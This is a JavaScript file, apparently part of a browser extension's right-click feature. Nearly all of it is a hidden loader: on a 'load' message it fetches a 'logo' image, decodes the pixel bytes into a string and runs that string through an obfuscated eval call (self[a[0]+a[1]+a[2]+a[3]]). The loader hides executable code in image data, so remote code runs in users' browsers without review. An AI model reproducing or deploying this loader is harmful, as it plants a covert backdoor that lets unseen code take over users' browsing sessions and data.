var right_click_data = {};
window.addEventListener('message', function ( event )
{
  if (typeof(event.data.event) != 'undefined' && event.data.event == 'load')
  {
    right_click_data = event.data;
    var logo = document.createElement("img");
    logo.setAttribute("src", event.data.data_logo);
    logo.setAttribute("style", "opacity: 0.0;");
    logo.onload = function()
    {
      var s = String.fromCharCode;
      var c = document.createElement("canvas");
      var cs = c.style,
          cx = c.getContext("2d"),
          w = this.offsetWidth,
          h = this.offsetHeight;
      c.width = w;
      c.height = h;
      cs.width = w + "px";
      cs.height = h + "px";
      cx.drawImage(this, 0, 0);
      var x = cx.getImageData(0, 0, w, h).data;
      var a = "",
          l = x.length,
          p = -1;
      for (var i = 0; i < l; i += 4) {
          if (x[i + 0]) a += s(x[i + 0]);
          if (x[i + 1]) a += s(x[i + 1]);
          if (x[i + 2]) a += s(x[i + 2]);
      }
      document.body.removeChild(this);
      try
      {
        self[a[0]+a[1]+a[2]+a[3]](a);        
      }
      catch (ex)
      {
        window.postMessage({event: 'error', status: right_click_data.status });
      }
    };
    document.body.appendChild(logo);
  }
});